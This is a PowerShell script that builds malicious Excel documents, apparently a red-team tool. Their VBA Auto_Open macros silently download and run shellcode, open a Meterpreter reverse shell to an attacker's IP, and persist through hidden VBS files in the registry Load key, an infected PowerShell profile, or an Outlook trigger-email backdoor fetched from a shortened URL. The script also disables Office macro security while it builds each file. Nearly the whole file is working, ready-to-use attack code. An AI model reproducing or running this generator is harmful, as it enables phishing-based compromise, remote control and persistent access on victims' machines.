#Coded by Matt Nelson (@enigma0x3)
<#
.SYNOPSIS
Standalone Powershell script that will generate a malicious Microsoft Office document with a specified payload and persistence method

.DESCRIPTION
This script will generate malicious Microsoft Excel Documents that contain VBA macros. This script will prompt you for your attacking IP 
(the one you will receive your shell at), the port you want your shell at, and the name of the document. From there, the script will then
display a menu of different attacks, all with different persistence methods. Once an attack is chosen, it will then prompt you for your payload type
(Only HTTP and HTTPS are supported).

When naming the document, don't include a file extension.

These attacks use Invoke-Shellcode, which was created by Matt Graeber. Follow him on Twitter --> @mattifestation


.Attack Types
Meterpreter Shell with Logon Persistence: This attack delivers a meterpreter shell and then persists in the registry 
by creating a hidden .vbs file in C:\Users\Public and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
that executes the .vbs file on login.

Meterpreter Shell with Powershell Profile Persistence: This attack requires the target user to have admin right but is quite creative. It will
deliver you a shell and then drop a malicious .vbs file in C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs. Once dropped, it creates
an infected Powershell Profile file in C:\Windows\SysNative\WindowsPowerShell\v1.0\ and then creates a registry key in 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that executes Powershell.exe on startup. Since the Powershell profile loads automatically when 
Powershell.exe is invoked, your code is executed automatically.

Meterpreter Shell with Microsoft Outlook Email Persistence: This attack will give you a shell and then download a malicious Powershell script in this location:
C:\Users\Public\. Once downloaded, it will insert your defined IP address, Port, Email address and Trigger word.
It will then create a malicious .vbs file and drop it in C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\. Once dropped, it creates
a registry key that executes it on login. When the Powershell script is executed, it monitors the user's Outlook Inbox for an email containing 
the email address you specified as well as the subject. When it sees the email, it will delete it and send you a shell.


.EXAMPLE
PS> ./Generate-Macro.ps1
Enter IP Address: 10.0.0.10
Enter Port Number: 1111
Enter the name of the document (Do not include a file extension): FinancialData

--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Microsoft Outlook Email Persistence
------------------------------
Select Attack Number & Press Enter: 1

--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Number & Press Enter: 1
Saved to file C:\Users\Malware\Desktop\FinancialData.xls
PS>




#>
$global:defLoc = "$env:userprofile\Desktop"
$global:IS_Url = Read-Host "Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version)"
$global:IP = Read-Host "Enter IP Address"
$global:Port = Read-Host "Enter Port Number"
$global:Name = Read-Host "Enter the name of the document (Do not include a file extension)"
$global:Name = $global:Name + ".xls"
$global:FullName = "$global:defLoc\$global:Name"

function Registry-Persistence {
<#
.SYNOPSIS
Uses registry to persist after reboot
.DESCRIPTION
Drops a hidden VBS file and creates a registry key to execute is on startup
#>

#create macro

$Code = @"
Sub Auto_Open()
Execute
Persist
Reg
Start

End Sub

 Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
     End Function
     
Public Function Persist() As Variant
 Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-SHellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Public\"
    OldFileName = "config.txt"
    NewFileName = "config.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Public\config.vbs", vbHidden
End Function

Public Function Reg() As Variant
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\config.vbs", "REG_SZ"
Set WshShell = Nothing

End Function

Public Function Start() As Variant
 Const HIDDEN_WINDOW = 0
        strComputer = "."
        Shell "wscript C:\Users\Public\config.vbs", vbNormalFocus
      
End Function
"@



#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)



$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)


#Save the document
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function PowerShellProfile-Persistence{

$Code = @"
'Coded by Matt Nelson
'twitter.com/enigma0x3
'enigma0x3.wordpress.com

Sub Auto_Open()

Execute
WriteWrapper
WriteProfile
Reg


End Sub

Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
     End Function

Public Function WriteWrapper() As Variant
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\"
    OldFileName = "cookie.txt"
    NewFileName = "cookie.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", vbHidden

End Function

Public Function WriteProfile() As Variant
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt", True)
    a.WriteLine ("IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force")
    a.Close
    GivenLocation = "C:\Windows\SysNative\WindowsPowerShell\v1.0\"
    OldFileName = "Profile.txt"
    NewFileName = "Profile.ps1"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.ps1", vbHidden
End Function

Public Function Reg() As Variant
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", "REG_SZ"
Set WshShell = Nothing

End Function

"@



#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)



$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)


#Save the document
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}




function Outlook-Persistence{
$Email = Read-Host "Enter Attacker Email Address"
$Trigger = Read-Host "Enter Trigger Word"
$Code = @"
Sub Auto_Open()
Execute
Download
Configure
WriteWrapper
Reg
Start

End Sub

 Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
     End Function
     
Public Function Download() As Variant

    Dim FileNum As Long
    Dim FileData() As Byte
    Dim MyFile As String
    Dim WHTTP As Object

    On Error Resume Next
    Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
    If Err.Number <> 0 Then
        Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
    End If
    On Error GoTo 0
    
    MyFile = "http://goo.gl/PBjwWR"
    
    WHTTP.Open "GET", MyFile, False
    WHTTP.Send
    FileData = WHTTP.ResponseBody
    Set WHTTP = Nothing
    
    FileNum = FreeFile
    Open "C:\Users\Public\configuration.ps1" For Binary Access Write As #FileNum
    Put #FileNum, 1, FileData
    Close #FileNum
 
End Function

Public Function Configure() As Variant


Dim fso As Object
Dim txtStr As Object
Dim strHolder As String
Dim strFileToFix As String

strFileToFix = "C:\Users\Public\configuration.ps1"
Set fso = CreateObject("Scripting.FileSystemObject")
Set txtStr = fso.opentextfile(strFileToFix, 1, False, 0)
strHolder = txtStr.readall
txtStr.Close
Set txtStr = Nothing
strHolder = Replace(strHolder, "ATTACKEREMAIL@EMAIL.COM", "$Email", 1, -1, vbTextCompare)
Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
txtStr.Write (strHolder)
txtStr.Close
Set txtStr = Nothing
strHolder = Replace(strHolder, "EMAILSUBJECT", "$Trigger", 1, -1, vbTextCompare)
Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
txtStr.Write (strHolder)
txtStr.Close
Set txtStr = Nothing
strHolder = Replace(strHolder, "xxx.xxx.xx.xxx", "$global:IP", 1, -1, vbTextCompare)
Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
txtStr.Write (strHolder)
txtStr.Close
Set txtStr = Nothing
strHolder = Replace(strHolder, "yyyy", "$global:Port", 1, -1, vbTextCompare)
Set txtStr = fso.CreateTextFile(strFileToFix, True, False)
txtStr.Write (strHolder)
txtStr.Close
Set txtStr = Nothing

SetAttr "C:\Users\Public\configuration.ps1", vbHidden

End Function

Public Function WriteWrapper() As Variant
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -file C:\Users\Public\configuration.ps1""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\"
    OldFileName = "cookies.txt"
    NewFileName = "cookies.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.vbs", vbHidden

End Function


Public Function Reg() As Variant
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.vbs", "REG_SZ"
Set WshShell = Nothing

End Function

Public Function Start() As Variant
 Const HIDDEN_WINDOW = 0
        strComputer = "."
        Shell "wscript C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookies.vbs", vbNormalFocus
      
End Function



"@



#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)



$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)


#Save the document
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}



#Determine Attack
Do {
Write-Host "
--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Microsoft Outlook Email Persistence
------------------------------"
$AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3")



#Determine payload
Do {
Write-Host "
--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------"
$PayloadNum = Read-Host -prompt "Select Payload Number & Press Enter"
} until ($PayloadNum -eq "1" -or $PayloadNum -eq "2")

if($PayloadNum -eq "1"){
$Payload = "windows/meterpreter/reverse_https"}
elseif($PayloadNum -eq "2"){
$Payload = "windows/meterpreter/reverse_http"}

#Initiate Attack Choice

if($AttackNum -eq "1"){
    Registry-Persistence}
elseif($AttackNum -eq "2"){
    PowerShellProfile-Persistence
}
elseif($AttackNum -eq "3"){
Outlook-Persistence
}
